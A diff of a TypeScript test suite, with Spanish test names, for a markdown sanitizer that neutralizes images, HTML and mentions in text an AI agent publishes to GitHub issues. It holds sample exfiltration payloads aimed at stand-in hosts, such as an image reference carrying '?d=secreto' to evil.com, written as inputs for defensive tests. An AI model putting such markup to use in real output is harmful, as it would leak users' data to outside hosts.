@@ -70,6 +70,13 @@ function fakeGithub(
   return { gh, calls }
 }
 
+function expectNoActiveMarkup(text: string, allowed: string[] = []): void {
+  let withoutAllowed = text
+  for (const snippet of allowed) withoutAllowed = withoutAllowed.split(snippet).join('')
+  expect(withoutAllowed).not.toContain('![')
+  expect(withoutAllowed).not.toMatch(/<[A-Za-z/!]/)
+}
+
 describe('composeEnrichedBody', () => {
   it('añade el Reportero auténtico, conserva adjuntos/contexto y quita el inyectado', () => {
     const body = [
@@ -180,49 +187,86 @@ describe('sanitizeMarkdown', () => {
 
     const sanitized = sanitizeMarkdown(text, { originalBody: ORIGINAL_BODY })
 
-    expect(sanitized).toContain('!\\[externa](https://evil.example/a.png)')
+    expect(sanitized).toContain('!\u200b[externa](https://evil.example/a.png)')
     expect(sanitized).toContain('[enlace](https://evil.example/path)')
     expect(sanitized).toContain('https://evil.example/suelto')
-    expect(sanitized).toContain('!\\[referencia][img]')
+    expect(sanitized).toContain('!\u200b[referencia][img]')
     expect(sanitized).toContain('[img]: https://evil.example/ref.png')
+    expectNoActiveMarkup(sanitized)
   })
 
-  it('escapa referencias aunque la definición esté en blockquote, lista, mayúsculas o entidad', () => {
-    const text = [
-      '> [x]: HTTPS://evil.com/a',
-      '- [y]: &#104;ttps://evil.com/b',
-      '',
-      '![i][x]',
-      '![j][y]',
-    ].join('\n')
+  it.each([
+    ['blockquote', '> [x]: HTTPS://evil.com/a'],
+    ['lista', '- [x]: HTTPS://evil.com/a'],
+    ['entidad', '> [x]: &#104;ttps://evil.com/a'],
+  ])('escapa la referencia con definición en %s', (_name, definition) => {
+    const sanitized = sanitizeMarkdown(`${definition}\n\n![i][x]`, { originalBody: '' })
 
+    expect(sanitized).toContain(definition)
+    expect(sanitized).toContain('!\u200b[i][x]')
+    expectNoActiveMarkup(sanitized)
+  })
+
+  it.each([
+    ['inline que cruza párrafos', '`\n\n![x](https://evil.com/a)\n\n`'],
+    ['cierre de distinta longitud', '` ![x](https://evil.com/a) ``'],
+    ['fence indentado', '    ```\n![x](https://evil.com/a)\n```'],
+    [
+      'fence en blockquote/list',
+      '> ```\n\n![x](https://evil.com/a)\n\n```\n\n- ```\n\n<img src="https://evil.com/x">\n\n```',
+    ],
+    ['fence con backtick en info', '```a`b\n![x](https://evil.com/a)\n```'],
+  ])('escapa imágenes y HTML también en %s', (_name, text) => {
     const sanitized = sanitizeMarkdown(text, { originalBody: '' })
 
-    expect(sanitized).toContain('> [x]: HTTPS://evil.com/a')
-    expect(sanitized).toContain('- [y]: &#104;ttps://evil.com/b')
-    expect(sanitized).toContain('!\\[i][x]')
-    expect(sanitized).toContain('!\\[j][y]')
+    expect(sanitized).toContain('!\u200b[')
+    expect(sanitized).not.toContain('<img')
+    expectNoActiveMarkup(sanitized)
   })
 
-  it('conserva solo las imágenes exactas del cuerpo original y escapa el resto de HTML', () => {
-    const original = `### Adjuntos\n![x](https://evil.example/original.png)`
+  it('reinserta solo imágenes inline permitidas y nunca referencias del original', () => {
+    const ownAsset = 'https://github.com/org/repo/assets/123'
+    const original = [
+      '### Adjuntos',
+      `![captura](${ATTACHMENT})`,
+      `![propia](${ownAsset})`,
+      '![externa](https://evil.example/original.png)',
+      '![referencia][x]',
+    ].join('\n')
     const text = [
-      '![x](https://evil.example/original.png)',
-      '![y](https://evil.example/other.png)',
+      `![captura](${ATTACHMENT})`,
+      `![propia](${ownAsset})`,
+      '![externa](https://evil.example/original.png)',
+      '![otra](https://evil.example/other.png)',
+      '![referencia][x]',
       '<img src="https://evil.example/x.png">',
       '<picture><source srcset="https://evil.example/x"><img src="https://evil.example/y"></picture>',
     ].join('\n')
 
-    const sanitized = sanitizeMarkdown(text, { originalBody: original })
+    const sanitized = sanitizeMarkdown(text, { originalBody: original, repository: REPO })
 
-    expect(sanitized).toContain('![x](https://evil.example/original.png)')
-    expect(sanitized).toContain('!\\[y](https://evil.example/other.png)')
-    expect(sanitized).toContain('&lt;img')
+    expect(sanitized).toContain(`![captura](${ATTACHMENT})`)
+    expect(sanitized).toContain(`![propia](${ownAsset})`)
+    expect(sanitized).toContain('!\u200b[externa](https://evil.example/original.png)')
+    expect(sanitized).toContain('!\u200b[otra](https://evil.example/other.png)')
+    expect(sanitized).toContain('!\u200b[referencia][x]')
     expect(sanitized).not.toContain('<img')
     expect(sanitized).not.toContain('<picture')
+    expectNoActiveMarkup(sanitized, [`![captura](${ATTACHMENT})`, `![propia](${ownAsset})`])
   })
 
-  it('no toca imágenes ni HTML dentro de bloques o código en línea', () => {
+  it('no reinserta una imagen de referencia original aunque el agente añada su definición', () => {
+    const original = '### Adjuntos\n![i][x]'
+    const text = '![i][x]\n\n[x]: HTTPS://evil.com/?d=secreto'
+
+    const sanitized = sanitizeMarkdown(text, { originalBody: original, repository: REPO })
+
+    expect(sanitized).toContain('!\u200b[i][x]')
+    expect(sanitized).toContain('[x]: HTTPS://evil.com/?d=secreto')
+    expectNoActiveMarkup(sanitized)
+  })
+
+  it('escapa imágenes y HTML dentro de código pero mantiene las menciones y el texto legibles', () => {
     const text = [
       '```md',
       '![x](https://evil.example/a.png)',
@@ -235,15 +279,18 @@ describe('sanitizeMarkdown', () => {
 
     const sanitized = sanitizeMarkdown(text, { originalBody: '' })
 
-    expect(sanitized).toContain('![x](https://evil.example/a.png)')
-    expect(sanitized).toContain('<img src="https://evil.example/x.png">')
+    expect(sanitized).toContain('!\u200b[x](https://evil.example/a.png)')
+    expect(sanitized).toContain('<\u200bimg src="https://evil.example/x.png">')
     expect(sanitized).toContain('@types/node @smoke')
-    expect(sanitized).toContain('`![y](https://evil.example/b.png) <tag> @types/node`')
+    expect(sanitized).toContain('`!\u200b[y](https://evil.example/b.png) <\u200btag> @types/node`')
+    expect(sanitized.replaceAll('\u200b', '')).toContain('![x](https://evil.example/a.png)')
+    expectNoActiveMarkup(sanitized)
   })
 
-  it('neutraliza menciones solo en texto y respeta correos, localhost y URLs', () => {
+  it('neutraliza menciones en texto, incluido /@usuario, y respeta correos y URLs', () => {
     const text = [
       'Hola @ana y @org/team',
+      'Mira /@usuario',
       'ana@example.com',
       '[local](http://localhost:4321/x)',
       'https://github.com/org/repo/issues/1',
@@ -253,20 +300,20 @@ describe('sanitizeMarkdown', () => {
 
     expect(sanitized).toContain('@\u200bana')
     expect(sanitized).toContain('@\u200borg')
+    expect(sanitized).toContain('/@\u200busuario')
     expect(sanitized).toContain('ana@example.com')
     expect(sanitized).toContain('[local](http://localhost:4321/x)')
     expect(sanitized).toContain('https://github.com/org/repo/issues/1')
+    expectNoActiveMarkup(sanitized)
   })
 
-  it('escapa HTML y comentarios HTML del texto normal', () => {
-    const text = '<b>@ana</b> <!-- oculto -->'
+  it('muestra <details> y <https://...> como texto', () => {
+    const text = '<details><summary>x</summary> <https://evil.example>'
     const sanitized = sanitizeMarkdown(text, { originalBody: '' })
 
-    expect(sanitized).not.toContain('<b>')
-    expect(sanitized).toContain('&lt;b>')
-    expect(sanitized).toContain('@\u200bana')
-    expect(sanitized).not.toContain('<!-- oculto -->')
-    expect(sanitized).toContain('&lt;!-- oculto -->')
+    expect(sanitized).toContain('<\u200bdetails>')
+    expect(sanitized).toContain('<\u200bhttps://evil.example>')
+    expectNoActiveMarkup(sanitized)
   })
 })
 
@@ -388,10 +435,11 @@ describe('publicación de los ficheros del agente', () => {
     const publishedBody = readFileSync(bodyFile, 'utf8')
     expect(publishedBody).toContain('- Identificador: user-1')
     expect(publishedBody).toContain(ATTACHMENT)
-    expect(publishedBody).toContain('!\\[externa](https://evil.example/a.png)')
+    expect(publishedBody).toContain('!\u200b[externa](https://evil.example/a.png)')
     expect(publishedBody).not.toContain('inyectado@example.com')
     expect(publishedBody).toContain('@\u200bana')
     expect(publishedBody.match(/^### Reportero$/gm)).toHaveLength(1)
+    expectNoActiveMarkup(publishedBody, [`![captura](${ATTACHMENT})`])
 
     const publishedComment = readFileSync(commentFile, 'utf8')
     expect(publishedComment).toContain('@\u200bana')
